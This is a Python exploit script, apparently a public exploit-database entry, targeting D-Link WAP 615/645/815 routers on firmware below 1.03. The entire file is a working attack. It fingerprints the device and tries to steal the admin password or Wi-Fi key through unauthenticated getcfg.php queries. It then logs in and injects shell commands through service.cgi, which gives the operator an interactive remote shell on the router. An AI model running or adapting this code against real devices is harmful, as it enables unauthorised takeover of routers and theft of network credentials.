#!/usr/bin/python

# Exploit Title: D-Link WAP 615/645/815 < 1.03 service.cgi RCE
# Exploit Author: Cr0n1c
# Vendor Homepage: us.dlink.com
# Software Link: https://github.com/Cr0n1c/dlink_shell_poc/blob/master/dlink_auth_rce
# Version: 1.03
# Tested on: D-Link 815 v1.03

import argparse
import httplib
import random
import re
import requests
import string
import urllib2

DLINK_REGEX = ['Product Page : <a href="http://support.dlink.com" target="_blank">(.*?)<',
               '<div class="modelname">(.*?)</div>',
               '<div class="pp">Product Page : (.*?)<a href="javascript:check_is_modified">'
             ]


def dlink_detection():
    try:
        r = requests.get(URL, timeout=10.00)
    except requests.exceptions.ConnectionError:
        print "Error: Failed to connect to " + URL
        return False

    if r.status_code != 200:
        print "Error: " + URL + " returned status code " + str(r.status_code)
        return False

    for rex in DLINK_REGEX:
        if re.search(rex, r.text):
            res = re.findall(rex, r.text)[0]
            return res

    print "Warning: Unable to detect device for " + URL
    return "Unknown Device"


def create_session():
    post_content = {"REPORT_METHOD": "xml",
                    "ACTION": "login_plaintext",
                    "USER": "admin",
                    "PASSWD": PASSWORD,
                    "CAPTCHA": ""
                    }

    try:
        r = requests.post(URL + "/session.cgi", data=post_content, headers=HEADER)
    except requests.exceptions.ConnectionError:
        print "Error: Failed to access " + URL + "/session.cgi"
        return False

    if not (r.status_code == 200 and r.reason == "OK"):
        print "Error: Did not recieve a HTTP 200"
        return False

    if not re.search("<RESULT>SUCCESS</RESULT>", r.text):
        print "Error: Did not get a success code"
        return False

    return True


def parse_results(result):
    print result[100:]
    return result


def send_post(command, print_res=True):
    post_content = "EVENT=CHECKFW%26" + command + "%26"

    method = "POST"

    if URL.lower().startswith("https"):
        handler = urllib2.HTTPSHandler()
    else:
        handler = urllib2.HTTPHandler()

    opener = urllib2.build_opener(handler)
    request = urllib2.Request(URL + "/service.cgi", data=post_content, headers=HEADER)
    request.get_method = lambda: method

    try:
        connection = opener.open(request)
    except urllib2.HTTPError:
        print "Error: failed to connect to " + URL + "/service.cgi"
        return False
    except urllib2.HTTPSError:
        print "Error: failed to connect to " + URL + "/service.cgi"
        return False

    if not connection.code == 200:
        print "Error: Recieved status code " + str(connection.code)
        return False

    attempts = 0

    while attempts < 5:
        try:
            data = connection.read()
        except httplib.IncompleteRead:
            attempts += 1
        else:
            break

        if attempts == 5:
            print "Error: Chunking failed %d times, bailing." %attempts
            return False

    if print_res:
        return parse_results(data)
    else:
        return data


def start_shell():
    print "+" + "-" * 80 + "+"
    print "| Welcome to D-Link Shell" + (" " * 56) + "|"
    print "+" + "-" * 80 + "+"
    print "| This is a limited shell that exploits piss poor programming.  I created this   |"
    print "| to give you a comfort zone and to emulate a real shell environment.  You will  |"
    print "| be limited to basic busybox commands.  Good luck and happy hunting.            |"
    print "|" + (" " * 80) + "|"
    print "| To quit type 'gtfo'" + (" " * 60) + "|"
    print "+" + "-" * 80 + "+\n\n"

    cmd = ""

    while True:
        cmd = raw_input(ROUTER_TYPE + "# ").strip()
        if cmd.lower() == "gtfo":
            break

        send_post(cmd)


def query_getcfg(param):
    post_data = {"SERVICES": param}
    try:
        r = requests.post(URL + "/getcfg.php", data=post_data, headers=HEADER)
    except requests.exceptions.ConnectionError:
        print "Error: Failed to access " + URL + "/getcfg.php"
        return False

    if not (r.status_code == 200 and r.reason == "OK"):
        print "Error: Did not recieve a HTTP 200"
        return False

    if re.search("<message>Not authorized</message>", r.text):
        print "Error: Not vulnerable"
        return False

    return r.text


def attempt_password_find():
    # Going fishing in DEVICE.ACCOUNT looking for CWE-200 or no password
    data = query_getcfg("DEVICE.ACCOUNT")
    if not data:
        return False

    res = re.findall("<password>(.*?)</password>", data)
    if len(res) > 0 and res != "=OoXxGgYy=":
        return res[0]

    # Did not find it in first attempt
    data = query_getcfg("WIFI")
    if not data:
        return False

    res = re.findall("<key>(.*?)</key>", data)
    if len(res) > 0:
        return res[0]

    # All attempts failed, just going to return and wish best of luck!
    return False


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="D-Link 615/815 Service.cgi RCE")

    parser.add_argument("-p", "--password", dest="password", action="store", default=None,
                        help="Password for the router.  If not supplied then will use blank password.")
    parser.add_argument("-u", "--url", dest="url", action="store", required=True,
                        help="[Required] URL for router (i.e. http://10.1.1.1:8080)")
    parser.add_argument("-x", "--attempt-exploit", dest="attempt_exploit", action="store_true", default=False,
                        help="If flag is set, will attempt CWE-200.  If that fails, then will attempt to discover "
                             "wifi password and use it.")

    args = parser.parse_args()

    HEADER = {"Cookie": "uid=" + "".join(random.choice(string.letters) for _ in range(10)),
              "Host": "localhost",
              "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
              }

    URL = args.url.lower().strip()

    if not URL.startswith("http"):
        URL = "http://" + URL

    ROUTER_TYPE = dlink_detection()

    if not ROUTER_TYPE:
        print "EXITING . . ."
        exit()

    if args.attempt_exploit and args.password is None:
        res = attempt_password_find()
        if res:
            PASSWORD = res
        else:
            PASSWORD = ""
        print "[+] Switching password to: " + PASSWORD
    elif args.password:
        PASSWORD = args.password
    else:
        PASSWORD = ""

    if not create_session():
        print "EXITING . . ."
        exit()

    if len(send_post("ls", False)) == 0:
        print "Appears this device [%s] is not vulnerable. EXITING . . ." %ROUTER_TYPE
        exit()

    start_shell()